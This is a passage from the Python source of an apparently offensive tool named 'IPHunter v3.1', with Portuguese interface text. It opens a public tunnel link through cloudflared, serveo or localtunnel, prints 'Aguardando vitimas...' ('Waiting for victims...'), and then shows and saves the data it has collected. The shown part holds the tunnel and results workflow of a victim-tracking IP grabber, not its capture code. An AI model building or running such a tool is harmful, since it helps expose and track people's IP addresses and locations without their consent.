        public_url = None
        if tunnel_choice == '1':
            public_url = start_cloudflared(port)
        elif tunnel_choice == '2':
            public_url = start_serveo(port)
        elif tunnel_choice == '3':
            public_url = start_localtunnel(port)

        print()
        if public_url:
            print(C.BRIGHT_GREEN + "═" * 60 + C.RESET)
            print(C.BRIGHT_GREEN + C.BOLD + "           🌐 LINK PUBLICO:" + C.RESET)
            print()
            print(f"    {C.BRIGHT_WHITE}{C.BOLD}{public_url}{C.RESET}")
            print()
            print(C.BRIGHT_GREEN + "═" * 60 + C.RESET)
        else:
            print(C.YELLOW + "═" * 60 + C.RESET)
            print(C.YELLOW + "    ⚠️  Nenhum tunel publico disponivel" + C.RESET)
            print(C.YELLOW + "    Use o link local acima (mesma rede WiFi)" + C.RESET)
            print(C.YELLOW + "═" * 60 + C.RESET)

        print()
        print(f"    {C.BRIGHT_CYAN}{C.BOLD}🎯 Aguardando vitimas...{C.RESET}")
        print(f"    {C.DIM}Pressione ENTER para parar o servidor e ver resultados{C.RESET}")
        print()

        try:
            input()
        except (EOFError, KeyboardInterrupt):
            pass

        stop_server()
        time.sleep(0.5)

        # Mostrar resultados
        clear()
        show_banner()
        show_results()

        print(f"    {C.CYAN}➤ Deseja salvar os resultados? (s/n):{C.RESET}", end=" ")
        try:
            save_choice = input().strip().lower()
            if save_choice == 's':
                save_results()
        except:
            pass

        print()
        print(f"    {C.CYAN}➤ Pressione ENTER para voltar ao menu...{C.RESET}")
        try:
            input()
        except:
            pass

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        if server_running:
            stop_server()
        clear()
        print()
        print_header("IPHunter v3.1 encerrado pelo usuario.")
        print()
    except Exception as e:
        clear()
        print()
        print_header(f"ERRO: {str(e)[:40]}")
        print()
